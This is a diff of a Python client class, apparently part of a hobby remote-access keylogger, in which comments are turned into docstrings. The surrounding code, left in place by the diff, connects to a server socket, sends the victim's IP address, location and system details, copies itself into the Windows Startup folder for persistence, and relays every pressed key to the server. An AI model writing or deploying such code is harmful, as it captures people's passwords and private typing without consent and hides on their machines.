@@ -10,7 +10,7 @@ from shutil import copyfile
 
 class Client:
     def __init__(self):
-        # checking
+        # Set the os and the path of this file
         self.os = system()
         self.path_file = path.abspath(__file__)
 
@@ -23,40 +23,51 @@ class Client:
         else:
             exit()
 
-        # Setting impoortant var
+        # Set important var
         self.client = s.socket()
         self.host = "localhost"
         self.port = 8080
         self.key_logger_mod = True
         self.conn_server()
 
-    # Connect to the server and start basic functions
     def conn_server(self):
+        """
+        This function connect to the server and start basic functions
+        """
         self.client.connect((self.host, self.port))
         print("Connessione effettuata!")
         sleep(1.5)
         self.get_vinfo()
         self.key_logger()
 
-    # Send message to the server
     def sendmsg(self, msg):
+        """
+        This function Send message to the server
+        """
         self.client.send(msg.encode())
 
-    # Get basic info of th ìe victim
     def get_vinfo(self):
+        """
+        This function get the  basic info of pc
+        """
         ip = geocoder.ip("me")
         pc_information = f"{getcwd()} {uname()} {processor()}"
         msg = f"ip: {ip} AND info: {pc_information}"
         self.sendmsg(msg)
 
-    # Set the file of auto-startup if the os is windows | <to test>
+    # To test
     def os_set(self):
+        """
+        Set file in startup dir if the os is windows
+        """
         if self.mod:
             path_startup = fr"C:\Users\{environ['USER']}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
             copyfile(self.path_file, path_startup)
 
-    # Listens and sends all keys pressed to the server
     def key_logger(self):
+        """
+        Listens and sends all keys pressed to the server
+        """
         with Listener(on_press=self.on_press) as listener:
             listener.join()
 
